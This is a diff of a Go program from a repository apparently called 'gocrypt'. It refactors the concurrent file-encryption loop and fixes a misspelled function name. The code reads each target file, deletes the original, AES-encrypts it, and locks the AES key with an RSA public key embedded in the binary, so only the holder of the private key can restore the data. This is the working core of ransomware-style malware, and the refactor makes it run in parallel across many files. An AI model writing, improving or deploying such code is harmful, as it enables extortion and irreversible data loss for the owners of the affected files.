@@ -4,6 +4,7 @@ import (
 	_ "embed"
 	"log"
 	"os"
+	s "sync"
 
 	"github.com/Devil666face/gocrypt/internal/async"
 	"github.com/Devil666face/gocrypt/internal/io"
@@ -14,38 +15,35 @@ import (
 //go:embed id_rsa.pub
 var PubKey string
 
-func Encrytp(f lib.File, errchan chan error) {
+func Encrypt(f lib.File) error {
+	if f.Path == "encrypt" {
+		return nil
+	}
 	in, err := io.ReadFile(f.Path)
 	if err != nil {
-		errchan <- err
-		return
+		return err
 	}
 	if err := os.Remove(f.Path); err != nil {
-		errchan <- err
-		return
+		return err
 	}
 	s := sync.New(in)
 	chip, err := s.Encrypt()
 	if err != nil {
-		errchan <- err
-		return
+		return err
 	}
 	a := async.New(s.AesKey, func(a *async.Async) {
 		a.PubKey = async.Key(PubKey)
 	})
 	chipAesKey, err := a.EncryptBase64()
 	if err != nil {
-		errchan <- err
-		return
+		return err
 	}
 	chip = append(chip, chipAesKey...)
 	if err := io.WriteFile(chip, f.Path+".enc"); err != nil {
-		errchan <- err
-		return
+		return err
 	}
 	log.Print(f.Path, " encrypted")
-	errchan <- nil
-	return
+	return nil
 }
 
 func main() {
@@ -54,102 +52,23 @@ func main() {
 		log.Fatal(err)
 	}
 
-	result := make(chan error, len(files))
-	for _, f := range files {
-		go Encrytp(f, result)
-	}
+	results := make(chan error, len(files))
+	go func() {
+		wg := s.WaitGroup{}
+		for _, file := range files {
+			wg.Add(1)
+			go func(file lib.File) {
+				defer wg.Done()
+				results <- Encrypt(file)
+			}(file)
+		}
+		wg.Wait()
+		close(results)
+	}()
 
-	select {
-	case err := <-result:
+	for err := range results {
 		if err != nil {
 			log.Print(err)
 		}
 	}
-	close(result)
-
-	// tasks := []func() error{}
-
-	// results := make(chan error, len(files))
-
-	// for _, f := range files {
-	// 	f = f
-	// 	tasks = append(tasks, func() error {
-	// 		return Encrytp(f)
-	// 	})
-	// }
-
-	// for _, task := range tasks {
-	// 	results <- task()
-	// }
-
-	// var wg s.WaitGroup
-	// for i := 0; i < 4; i++ {
-	// 	wg.Add(1)
-	// 	go func() {
-	// 		for res := range results {
-	// 			if res != nil {
-	// 				log.Print(res)
-	// 			}
-	// 		}
-	// 		wg.Done()
-	// 	}()
-	// }
-
-	// close(results)
-	// wg.Wait()
-
-	// for _, f := range files {
-	// in, err := io.ReadFile(f.Path)
-	// if err != nil {
-	// 	log.Print(err)
-	// 	continue
-	// }
-	// if err := os.Remove(f.Path); err != nil {
-	// 	log.Print(err)
-	// 	continue
-	// }
-	// s := sync.New(in)
-	// chip, err := s.Encrypt()
-	// if err != nil {
-	// 	log.Print(err)
-	// 	continue
-	// }
-	// a := async.New(s.AesKey, func(a *async.Async) {
-	// 	a.PubKey = async.Key(PubKey)
-	// })
-	// chipAesKey, err := a.EncryptBase64()
-	// if err != nil {
-	// 	log.Print(err)
-	// 	continue
-	// }
-	// chip = append(chip, chipAesKey...)
-	// if err := io.WriteFile(chip, f.Path+".enc"); err != nil {
-	// 	log.Print(err)
-	// 	continue
-	// }
-	// log.Print(f.Path, " encrypted")
-	// }
-
-	// i := crypt.NewInput()
-	// in, err := io.ReadFile(i.InPath)
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-	// s := sync.New(in)
-	// chip, err := s.Encrypt()
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-	// a := async.New(s.AesKey, func(a *async.Async) {
-	// 	a.PubKey = async.Key(PubKey)
-	// })
-	// chipAesKey, err := a.EncryptBase64()
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-	// chip = append(chip, chipAesKey...)
-	// if err := io.WriteFile(chip, i.OutPath); err != nil {
-	// 	log.Fatal(err)
-	// }
-	// os.Exit(0)
 }
